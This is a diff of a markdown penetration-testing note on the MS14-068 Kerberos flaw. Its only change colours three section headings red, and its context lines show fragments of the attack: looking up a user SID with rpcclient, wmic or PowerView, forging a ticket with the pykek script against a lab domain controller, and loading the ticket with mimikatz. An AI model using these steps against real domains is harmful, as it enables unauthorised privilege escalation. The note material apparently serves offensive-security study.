@@ -10,7 +10,7 @@ This vulnerability will impact the windows server versions up to windows server 
 
 #### This exploit require to know the user SID, you can use `rpcclient` to remotely get it or `wmi` if you have an access on the machine.
 
-## Finding SID
+## <mark style="color:red;">Finding SID</mark>
 
 to find the SID remotely:
 
@@ -37,7 +37,7 @@ wmic useraccount get name,sid
 Convert-NameToSid high-sec-corp.localkrbtgt (powerview)
 ```
 
-## Generating Ticket
+## <mark style="color:red;">Generating Ticket</mark>
 
 can use pykek or metasploit:
 
@@ -65,7 +65,7 @@ python ms14-068.py -u user01@metasploitable.local -d msfdc01.metasploitable.loca
 -1105
 ```
 
-## Loading the Ticket
+## <mark style="color:red;">Loading the Ticket</mark>
 
 Use `mimikatz` to load the ticket.
 
